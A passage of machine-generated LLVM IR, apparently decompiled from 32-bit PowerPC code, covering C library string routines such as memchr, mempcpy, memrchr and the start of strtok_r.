  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000d60c.dec_label_pc_1000d60c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d59c, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000d630 = urem i32 %arg1, 256
  store i32 %v1_1000d630, i32* %r4.global-to-local, align 4
  %v0_1000d6507 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000d65413 = icmp eq i32 %arg2, 0
  br i1 %v2_1000d65413, label %dec_label_pc_1000d65c, label %dec_label_pc_1000d658

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d658
  %v1_1000d63c = inttoptr i32 %v0_1000d63c to i8*
  %v2_1000d63c = load i8, i8* %v1_1000d63c, align 1
  %v3_1000d63c = zext i8 %v2_1000d63c to i32
  %v0_1000d640 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d640 = add i32 %v0_1000d640, -1
  store i32 %v1_1000d640, i32* %r5.global-to-local, align 4
  %v1_1000d644 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d644 = icmp eq i32 %v3_1000d63c, %v1_1000d644
  %v0_1000d648 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d644, i32 %v0_1000d648)
  %v0_1000d64c = load i32, i32* @r3, align 4
  %v1_1000d64c = add i32 %v0_1000d64c, 1
  store i32 %v1_1000d64c, i32* @r3, align 4
  %v0_1000d654 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d654 = add i32 %v0_1000d654, -1
  store i32 %v1_1000d654, i32* %ctr.global-to-local, align 4
  %v2_1000d654 = icmp eq i32 %v1_1000d654, 0
  br i1 %v2_1000d654, label %dec_label_pc_1000d65c.loopexit, label %dec_label_pc_1000d658

dec_label_pc_1000d658:                            ; preds = %entry, %dec_label_pc_1000d63c
  %v0_1000d63c = phi i32 [ %v1_1000d64c, %dec_label_pc_1000d63c ], [ %v0_1000d6507, %entry ]
  %v0_1000d658.in.in = phi i32 [ %v1_1000d64c, %dec_label_pc_1000d63c ], [ %v0_1000d6507, %entry ]
  %v0_1000d658.in = urem i32 %v0_1000d658.in.in, 4
  %v0_1000d658 = icmp eq i32 %v0_1000d658.in, 0
  br i1 %v0_1000d658, label %dec_label_pc_1000d65c.loopexit, label %dec_label_pc_1000d63c

dec_label_pc_1000d65c.loopexit:                   ; preds = %dec_label_pc_1000d658, %dec_label_pc_1000d63c
  %v0_1000d68416.ph = phi i32 [ %v1_1000d64c, %dec_label_pc_1000d63c ], [ %v0_1000d63c, %dec_label_pc_1000d658 ]
  %v0_1000d65c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d660.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d65c

dec_label_pc_1000d65c:                            ; preds = %dec_label_pc_1000d65c.loopexit, %entry
  %v0_1000d660 = phi i32 [ 0, %entry ], [ %v0_1000d660.pre, %dec_label_pc_1000d65c.loopexit ]
  %v0_1000d65c = phi i32 [ %v1_1000d630, %entry ], [ %v0_1000d65c.pre, %dec_label_pc_1000d65c.loopexit ]
  %v0_1000d68416 = phi i32 [ %v0_1000d6507, %entry ], [ %v0_1000d68416.ph, %dec_label_pc_1000d65c.loopexit ]
  %v1_1000d65c = mul i32 %v0_1000d65c, 256
  %v1_1000d660 = udiv i32 %v0_1000d660, 4
  %v2_1000d664 = or i32 %v1_1000d65c, %v0_1000d65c
  %v1_1000d66c = mul i32 %v2_1000d664, 65536
  %v2_1000d678 = or i32 %v1_1000d66c, %v2_1000d664
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_1000d660, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d660, 4
  br i1 %tmp, label %dec_label_pc_1000d70c, label %dec_label_pc_1000d684

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d65c, %dec_label_pc_1000d708.backedge
  %v0_1000d708 = phi i32 [ %v1_1000d708, %dec_label_pc_1000d708.backedge ], [ %v1_1000d660, %dec_label_pc_1000d65c ]
  %v0_1000d68c = phi i32 [ %v1_1000d68c, %dec_label_pc_1000d708.backedge ], [ %v0_1000d660, %dec_label_pc_1000d65c ]
  %v0_1000d6c4 = phi i32 [ %v1_1000d688, %dec_label_pc_1000d708.backedge ], [ %v0_1000d68416, %dec_label_pc_1000d65c ]
  %v1_1000d684 = inttoptr i32 %v0_1000d6c4 to i32*
  %v2_1000d684 = load i32, i32* %v1_1000d684, align 4
  %v1_1000d688 = add i32 %v0_1000d6c4, 4
  store i32 %v1_1000d688, i32* @r3, align 4
  %v1_1000d68c = add i32 %v0_1000d68c, -4
  store i32 %v1_1000d68c, i32* %r5.global-to-local, align 4
  %v1_1000d690 = add i32 %v0_1000d6c4, 1
  %v2_1000d694 = xor i32 %v2_1000d684, %v2_1000d678
  %v1_1000d69c = add i32 %v2_1000d694, 2130640639
  %v2_1000d6a0 = xor i32 %v1_1000d69c, %v2_1000d694
  %v2_1000d6a4 = and i32 %v2_1000d6a0, -2130640640
  %v6_1000d6a4 = icmp eq i32 %v2_1000d6a4, -2130640640
  br i1 %v6_1000d6a4, label %dec_label_pc_1000d708.backedge, label %dec_label_pc_1000d6b0

dec_label_pc_1000d708.backedge:                   ; preds = %dec_label_pc_1000d684, %dec_label_pc_1000d6f4
  %v1_1000d708 = add i32 %v0_1000d708, -1
  store i32 %v1_1000d708, i32* %ctr.global-to-local, align 4
  %v2_1000d708 = icmp eq i32 %v1_1000d708, 0
  br i1 %v2_1000d708, label %dec_label_pc_1000d70c, label %dec_label_pc_1000d684

dec_label_pc_1000d6b0:                            ; preds = %dec_label_pc_1000d684
  %v2_1000d6b0 = inttoptr i32 %v0_1000d6c4 to i8*
  %v3_1000d6b0 = load i8, i8* %v2_1000d6b0, align 1
  %v4_1000d6b0 = zext i8 %v3_1000d6b0 to i32
  %v1_1000d6b4 = add i32 %v0_1000d6c4, 3
  store i32 %v1_1000d6b4, i32* @r8, align 4
  %v1_1000d6b8 = add i32 %v0_1000d6c4, 2
  %v4_1000d6bc = icmp eq i32 %v4_1000d6b0, %v0_1000d65c
  br i1 %v4_1000d6bc, label %dec_label_pc_1000d6c4, label %dec_label_pc_1000d6cc

dec_label_pc_1000d6c4:                            ; preds = %dec_label_pc_1000d6b0
  ret i32 %v0_1000d6c4

dec_label_pc_1000d6cc:                            ; preds = %dec_label_pc_1000d6b0
  %v2_1000d6cc = inttoptr i32 %v1_1000d690 to i8*
  %v3_1000d6cc = load i8, i8* %v2_1000d6cc, align 1
  %v4_1000d6cc = zext i8 %v3_1000d6cc to i32
  %v4_1000d6d0 = icmp eq i32 %v4_1000d6cc, %v0_1000d65c
  br i1 %v4_1000d6d0, label %dec_label_pc_1000d6d8, label %dec_label_pc_1000d6e0

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d6cc
  ret i32 %v1_1000d690

dec_label_pc_1000d6e0:                            ; preds = %dec_label_pc_1000d6cc
  %v2_1000d6e0 = inttoptr i32 %v1_1000d6b8 to i8*
  %v3_1000d6e0 = load i8, i8* %v2_1000d6e0, align 1
  %v4_1000d6e0 = zext i8 %v3_1000d6e0 to i32
  %v4_1000d6e4 = icmp eq i32 %v4_1000d6e0, %v0_1000d65c
  br i1 %v4_1000d6e4, label %dec_label_pc_1000d6ec, label %dec_label_pc_1000d6f4

dec_label_pc_1000d6ec:                            ; preds = %dec_label_pc_1000d6e0
  ret i32 %v1_1000d6b8

dec_label_pc_1000d6f4:                            ; preds = %dec_label_pc_1000d6e0
  %v2_1000d6f4 = inttoptr i32 %v1_1000d6b4 to i8*
  %v3_1000d6f4 = load i8, i8* %v2_1000d6f4, align 1
  %v4_1000d6f4 = zext i8 %v3_1000d6f4 to i32
  %v4_1000d6f8 = icmp eq i32 %v4_1000d6f4, %v0_1000d65c
  br i1 %v4_1000d6f8, label %dec_label_pc_1000d700, label %dec_label_pc_1000d708.backedge

dec_label_pc_1000d700:                            ; preds = %dec_label_pc_1000d6f4
  ret i32 %v1_1000d6b4

dec_label_pc_1000d70c:                            ; preds = %dec_label_pc_1000d708.backedge, %dec_label_pc_1000d65c
  %v0_1000d71826 = phi i32 [ %v0_1000d68416, %dec_label_pc_1000d65c ], [ %v1_1000d688, %dec_label_pc_1000d708.backedge ]
  %v0_1000d70c = phi i32 [ %v0_1000d660, %dec_label_pc_1000d65c ], [ %v1_1000d68c, %dec_label_pc_1000d708.backedge ]
  %v1_1000d70c = add i32 %v0_1000d70c, 1
  store i32 %v1_1000d70c, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d70c, i32* %ctr.global-to-local, align 4
  %v2_1000d7283 = icmp eq i32 %v0_1000d70c, 0
  br i1 %v2_1000d7283, label %dec_label_pc_1000d72c, label %dec_label_pc_1000d718

dec_label_pc_1000d718:                            ; preds = %dec_label_pc_1000d70c, %dec_label_pc_1000d718.dec_label_pc_1000d718_crit_edge
  %v1_1000d71c = phi i32 [ %v1_1000d71c.pre, %dec_label_pc_1000d718.dec_label_pc_1000d718_crit_edge ], [ %v0_1000d65c, %dec_label_pc_1000d70c ]
  %v0_1000d718 = phi i32 [ %v1_1000d724, %dec_label_pc_1000d718.dec_label_pc_1000d718_crit_edge ], [ %v0_1000d71826, %dec_label_pc_1000d70c ]
  %v1_1000d718 = inttoptr i32 %v0_1000d718 to i8*
  %v2_1000d718 = load i8, i8* %v1_1000d718, align 1
  %v3_1000d718 = zext i8 %v2_1000d718 to i32
  %v4_1000d71c = icmp eq i32 %v3_1000d718, %v1_1000d71c
  %v0_1000d720 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d71c, i32 %v0_1000d720)
  %v0_1000d724 = load i32, i32* @r3, align 4
  %v1_1000d724 = add i32 %v0_1000d724, 1
  store i32 %v1_1000d724, i32* @r3, align 4
  %v0_1000d728 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d728 = add i32 %v0_1000d728, -1
  store i32 %v1_1000d728, i32* %ctr.global-to-local, align 4
  %v2_1000d728 = icmp eq i32 %v1_1000d728, 0
  br i1 %v2_1000d728, label %dec_label_pc_1000d72c, label %dec_label_pc_1000d718.dec_label_pc_1000d718_crit_edge

dec_label_pc_1000d718.dec_label_pc_1000d718_crit_edge: ; preds = %dec_label_pc_1000d718
  %v1_1000d71c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d718

dec_label_pc_1000d72c:                            ; preds = %dec_label_pc_1000d718, %dec_label_pc_1000d70c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d728, { 1, 0 }
  uselistorder i32 %v1_1000d724, { 1, 0 }
  uselistorder i32 %v0_1000d70c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d708, { 2, 1, 0 }
  uselistorder i32 %v1_1000d68c, { 0, 2, 1 }
  uselistorder i32 %v1_1000d688, { 0, 2, 1 }
  uselistorder i32 %v0_1000d6c4, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000d664, { 1, 0 }
  uselistorder i32 %v1_1000d660, { 1, 0 }
  uselistorder i32 %v0_1000d68416, { 1, 0 }
  uselistorder i32 %v0_1000d65c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000d660, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d654, { 1, 0 }
  uselistorder i32 %v1_1000d64c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000d6507, { 2, 0, 1 }
  uselistorder i32 %v1_1000d630, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d718, { 1, 0 }
  uselistorder label %dec_label_pc_1000d708.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d684, { 1, 0 }
  uselistorder label %dec_label_pc_1000d658, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268490576, i32* @lr, align 4
  %v0_1000d74c = call i32 @memcpy()
  %v0_1000d754 = load i32, i32* @r28, align 4
  %v1_1000d754 = load i32, i32* @r29, align 4
  %v2_1000d754 = add i32 %v1_1000d754, %v0_1000d754
  ret i32 %v2_1000d754
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d76c = urem i32 %arg2, 256
  store i32 %v1_1000d76c, i32* %r4.global-to-local, align 4
  %v2_1000d774 = add i32 %arg3, %arg1
  store i32 %v2_1000d774, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000d79013 = icmp eq i32 %arg3, 0
  br i1 %v2_1000d79013, label %dec_label_pc_1000d798, label %dec_label_pc_1000d794

dec_label_pc_1000d77c:                            ; preds = %dec_label_pc_1000d794
  %v1_1000d77c = add i32 %v0_1000d77c, -1
  %v2_1000d77c = inttoptr i32 %v1_1000d77c to i8*
  %v3_1000d77c = load i8, i8* %v2_1000d77c, align 1
  %v4_1000d77c = zext i8 %v3_1000d77c to i32
  store i32 %v1_1000d77c, i32* %r3.global-to-local, align 4
  %v0_1000d780 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d780 = add i32 %v0_1000d780, -1
  store i32 %v1_1000d780, i32* %r5.global-to-local, align 4
  %v1_1000d784 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d784 = icmp eq i32 %v4_1000d77c, %v1_1000d784
  %v0_1000d788 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d784, i32 %v0_1000d788)
  %v0_1000d78c = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d790 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d790 = add i32 %v0_1000d790, -1
  store i32 %v1_1000d790, i32* %ctr.global-to-local, align 4
  %v2_1000d790 = icmp eq i32 %v1_1000d790, 0
  br i1 %v2_1000d790, label %dec_label_pc_1000d798.loopexit, label %dec_label_pc_1000d794

dec_label_pc_1000d794:                            ; preds = %entry, %dec_label_pc_1000d77c
  %v0_1000d77c = phi i32 [ %v0_1000d78c, %dec_label_pc_1000d77c ], [ %v2_1000d774, %entry ]
  %v0_1000d794.in.in = phi i32 [ %v0_1000d78c, %dec_label_pc_1000d77c ], [ %v2_1000d774, %entry ]
  %v0_1000d794.in = urem i32 %v0_1000d794.in.in, 4
  %v0_1000d794 = icmp eq i32 %v0_1000d794.in, 0
  br i1 %v0_1000d794, label %dec_label_pc_1000d798.loopexit, label %dec_label_pc_1000d77c

dec_label_pc_1000d798.loopexit:                   ; preds = %dec_label_pc_1000d794, %dec_label_pc_1000d77c
  %v0_1000d7c016.ph = phi i32 [ %v0_1000d78c, %dec_label_pc_1000d77c ], [ %v0_1000d77c, %dec_label_pc_1000d794 ]
  %v0_1000d798.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d79c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d798

dec_label_pc_1000d798:                            ; preds = %dec_label_pc_1000d798.loopexit, %entry
  %v0_1000d79c = phi i32 [ 0, %entry ], [ %v0_1000d79c.pre, %dec_label_pc_1000d798.loopexit ]
  %v0_1000d798 = phi i32 [ %v1_1000d76c, %entry ], [ %v0_1000d798.pre, %dec_label_pc_1000d798.loopexit ]
  %v0_1000d7c016 = phi i32 [ %v2_1000d774, %entry ], [ %v0_1000d7c016.ph, %dec_label_pc_1000d798.loopexit ]
  %v1_1000d798 = mul i32 %v0_1000d798, 256
  %v1_1000d79c = udiv i32 %v0_1000d79c, 4
  %v2_1000d7a0 = or i32 %v1_1000d798, %v0_1000d798
  %v1_1000d7a8 = mul i32 %v2_1000d7a0, 65536
  %v2_1000d7b4 = or i32 %v1_1000d7a8, %v2_1000d7a0
  store i32 %v2_1000d7b4, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_1000d79c, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d79c, 4
  br i1 %tmp, label %dec_label_pc_1000d838, label %dec_label_pc_1000d7c0

dec_label_pc_1000d7c0:                            ; preds = %dec_label_pc_1000d798, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge
  %v0_1000d83421 = phi i32 [ %v1_1000d834, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge ], [ %v1_1000d79c, %dec_label_pc_1000d798 ]
  %v0_1000d7e0 = phi i32 [ %v0_1000d7e0.pre, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge ], [ -2130640640, %dec_label_pc_1000d798 ]
  %v0_1000d7c8 = phi i32 [ %v0_1000d7c8.pre, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge ], [ %v2_1000d7b4, %dec_label_pc_1000d798 ]
  %v0_1000d7c4 = phi i32 [ %v0_1000d7c4.pre, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge ], [ %v0_1000d79c, %dec_label_pc_1000d798 ]
  %v0_1000d7c0 = phi i32 [ %v0_1000d7c0.pre, %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge ], [ %v0_1000d7c016, %dec_label_pc_1000d798 ]
  %v1_1000d7c0 = add i32 %v0_1000d7c0, -4
  %v2_1000d7c0 = inttoptr i32 %v1_1000d7c0 to i32*
  %v3_1000d7c0 = load i32, i32* %v2_1000d7c0, align 4
  store i32 %v1_1000d7c0, i32* %r3.global-to-local, align 4
  %v1_1000d7c4 = add i32 %v0_1000d7c4, -4
  store i32 %v1_1000d7c4, i32* %r5.global-to-local, align 4
  %v2_1000d7c8 = xor i32 %v3_1000d7c0, %v0_1000d7c8
  %v1_1000d7cc = add i32 %v0_1000d7c0, -3
  %v1_1000d7d4 = add i32 %v2_1000d7c8, 2130640639
  %v1_1000d7dc = add i32 %v0_1000d7c0, -2
  %v2_1000d7d8 = sub i32 -1, %v2_1000d7c8
  %v2_1000d7e0 = xor i32 %v1_1000d7d4, %v2_1000d7d8
  %v3_1000d7e0 = and i32 %v2_1000d7e0, %v0_1000d7e0
  %v6_1000d7e0 = icmp eq i32 %v3_1000d7e0, 0
  %v1_1000d7e4 = add i32 %v0_1000d7c0, -1
  br i1 %v6_1000d7e0, label %dec_label_pc_1000d834.backedge, label %dec_label_pc_1000d7ec

dec_label_pc_1000d7ec:                            ; preds = %dec_label_pc_1000d7c0
  %v2_1000d7ec = inttoptr i32 %v1_1000d7e4 to i8*
  %v3_1000d7ec = load i8, i8* %v2_1000d7ec, align 1
  %v4_1000d7ec = zext i8 %v3_1000d7ec to i32
  %v1_1000d7f0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d7f0 = icmp eq i32 %v4_1000d7ec, %v1_1000d7f0
  br i1 %v4_1000d7f0, label %dec_label_pc_1000d7f8, label %dec_label_pc_1000d800

dec_label_pc_1000d7f8:                            ; preds = %dec_label_pc_1000d7ec
  store i32 %v1_1000d7e4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d7e4

dec_label_pc_1000d800:                            ; preds = %dec_label_pc_1000d7ec
  %v2_1000d800 = inttoptr i32 %v1_1000d7dc to i8*
  %v3_1000d800 = load i8, i8* %v2_1000d800, align 1
  %v4_1000d800 = zext i8 %v3_1000d800 to i32
  %v4_1000d804 = icmp eq i32 %v4_1000d800, %v1_1000d7f0
  br i1 %v4_1000d804, label %dec_label_pc_1000d80c, label %dec_label_pc_1000d814

dec_label_pc_1000d80c:                            ; preds = %dec_label_pc_1000d800
  store i32 %v1_1000d7dc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d7dc

dec_label_pc_1000d814:                            ; preds = %dec_label_pc_1000d800
  %v2_1000d814 = inttoptr i32 %v1_1000d7cc to i8*
  %v3_1000d814 = load i8, i8* %v2_1000d814, align 1
  %v4_1000d814 = zext i8 %v3_1000d814 to i32
  %v4_1000d818 = icmp eq i32 %v4_1000d814, %v1_1000d7f0
  br i1 %v4_1000d818, label %dec_label_pc_1000d820, label %dec_label_pc_1000d828

dec_label_pc_1000d820:                            ; preds = %dec_label_pc_1000d814
  store i32 %v1_1000d7cc, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d7cc

dec_label_pc_1000d828:                            ; preds = %dec_label_pc_1000d814
  %v1_1000d828 = inttoptr i32 %v1_1000d7c0 to i8*
  %v2_1000d828 = load i8, i8* %v1_1000d828, align 1
  %v3_1000d828 = zext i8 %v2_1000d828 to i32
  %v4_1000d82c = icmp eq i32 %v3_1000d828, %v1_1000d7f0
  %v0_1000d830 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d82c, i32 %v0_1000d830)
  %v0_1000d834.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d834.backedge

dec_label_pc_1000d834.backedge:                   ; preds = %dec_label_pc_1000d828, %dec_label_pc_1000d7c0
  %v0_1000d834 = phi i32 [ %v0_1000d834.pre, %dec_label_pc_1000d828 ], [ %v0_1000d83421, %dec_label_pc_1000d7c0 ]
  %v1_1000d834 = add i32 %v0_1000d834, -1
  store i32 %v1_1000d834, i32* %ctr.global-to-local, align 4
  %v2_1000d834 = icmp eq i32 %v1_1000d834, 0
  br i1 %v2_1000d834, label %dec_label_pc_1000d834.dec_label_pc_1000d838_crit_edge, label %dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge

dec_label_pc_1000d834.backedge.dec_label_pc_1000d7c0_crit_edge: ; preds = %dec_label_pc_1000d834.backedge
  %v0_1000d7c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d7c4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000d7c8.pre = load i32, i32* @r7, align 4
  %v0_1000d7e0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d7c0

dec_label_pc_1000d834.dec_label_pc_1000d838_crit_edge: ; preds = %dec_label_pc_1000d834.backedge
  %v0_1000d838.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d838

dec_label_pc_1000d838:                            ; preds = %dec_label_pc_1000d834.dec_label_pc_1000d838_crit_edge, %dec_label_pc_1000d798
  %v0_1000d838 = phi i32 [ %v0_1000d838.pre, %dec_label_pc_1000d834.dec_label_pc_1000d838_crit_edge ], [ %v0_1000d79c, %dec_label_pc_1000d798 ]
  %v1_1000d838 = add i32 %v0_1000d838, 1
  store i32 %v1_1000d838, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d838, i32* %ctr.global-to-local, align 4
  %v2_1000d8503 = icmp eq i32 %v0_1000d838, 0
  br i1 %v2_1000d8503, label %dec_label_pc_1000d854, label %dec_label_pc_1000d844

dec_label_pc_1000d844:                            ; preds = %dec_label_pc_1000d838, %dec_label_pc_1000d844
  %v0_1000d844 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000d844 = add i32 %v0_1000d844, -1
  %v2_1000d844 = inttoptr i32 %v1_1000d844 to i8*
  %v3_1000d844 = load i8, i8* %v2_1000d844, align 1
  %v4_1000d844 = zext i8 %v3_1000d844 to i32
  store i32 %v1_1000d844, i32* %r3.global-to-local, align 4
  %v1_1000d848 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d848 = icmp eq i32 %v4_1000d844, %v1_1000d848
  %v0_1000d84c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d848, i32 %v0_1000d84c)
  %v0_1000d850 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d850 = add i32 %v0_1000d850, -1
  store i32 %v1_1000d850, i32* %ctr.global-to-local, align 4
  %v2_1000d850 = icmp eq i32 %v1_1000d850, 0
  br i1 %v2_1000d850, label %dec_label_pc_1000d854, label %dec_label_pc_1000d844

dec_label_pc_1000d854:                            ; preds = %dec_label_pc_1000d844, %dec_label_pc_1000d838
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d850, { 1, 0 }
  uselistorder i32 %v0_1000d838, { 1, 2, 0 }
  uselistorder i32 %v1_1000d834, { 2, 1, 0 }
  uselistorder i32 %v1_1000d7e4, { 1, 0, 2 }
  uselistorder i32 %v1_1000d7dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d7cc, { 1, 0, 2 }
  uselistorder i32 %v2_1000d7a0, { 1, 0 }
  uselistorder i32 %v1_1000d79c, { 1, 0 }
  uselistorder i32 %v0_1000d798, { 1, 0 }
  uselistorder i32 %v0_1000d79c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d790, { 1, 0 }
  uselistorder i32 %v0_1000d78c, { 1, 0, 2 }
  uselistorder i32 %v2_1000d774, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000d76c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d844, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d794, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d860 = load i32, i32* @lr, align 4
  store i32 %v0_1000d860, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000d868 = icmp eq i32 %arg1, 0
  %v0_1000d870 = load i32, i32* @r5, align 4
  store i32 %v0_1000d870, i32* %r30.global-to-local, align 4
  %v0_1000d874 = load i32, i32* @r4, align 4
  store i32 %v0_1000d874, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d868, label %dec_label_pc_1000d87c, label %dec_label_pc_1000d880

dec_label_pc_1000d87c:                            ; preds = %entry
  %v1_1000d87c = inttoptr i32 %v0_1000d870 to i32*
  %v2_1000d87c = load i32, i32* %v1_1000d87c, align 4
  store i32 %v2_1000d87c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d880

dec_label_pc_1000d880:                            ; preds = %entry, %dec_label_pc_1000d87c
  %v0_1000d880 = phi i32 [ %arg1, %entry ], [ %v2_1000d87c, %dec_label_pc_1000d87c ]
  store i32 %v0_1000d880, i32* @r3, align 4
  %v1_1000d884 = inttoptr i32 %v0_1000d880 to i8*
  %v2_1000d884 = call i32 @__GI_strspn(i8* %v1_1000d884)
  %v0_1000d888 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000d88c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d88c = add i32 %v0_1000d88c, %v2_1000d884
  %v3_1000d88c = inttoptr i32 %v2_1000d88c to i8*
  %v4_1000d88c = load i8, i8* %v3_1000d88c, align 1
  store i32 %v2_1000d88c, i32* @r31, align 4
  store i32 %v2_1000d88c, i32* @r3, align 4
  %v3_1000d898 = icmp eq i8 %v4_1000d88c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d898, label %dec_label_pc_1000d8a4, label %dec_label_pc_1000d8ac

dec_label_pc_1000d8a4:                            ; preds = %dec_label_pc_1000d880
  %v1_1000d8a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d8a4 = inttoptr i32 %v1_1000d8a4 to i32*
  store i32 %v2_1000d88c, i32* %v2_1000d8a4, align 4
  br label %dec_label_pc_1000d8e4

dec_label_pc_1000d8ac:                            ; preds = %dec_label_pc_1000d880
  store i32 268490928, i32* @lr, align 4
  %v3_1000d8ac = call i32 @__GI_strpbrk(i8* %v3_1000d88c, i32 %v0_1000d888)
  %v4_1000d8b4 = icmp eq i32 %v3_1000d8ac, 0
  %v0_1000d8b8 = load i32, i32* @r31, align 4
  store i32 %v0_1000d8b8, i32* @r3, align 4
  %v2_1000d8bc = add i32 %v3_1000d8ac, 1
  store i32 %v2_1000d8bc, i32* %r11.global-to-local, align 4
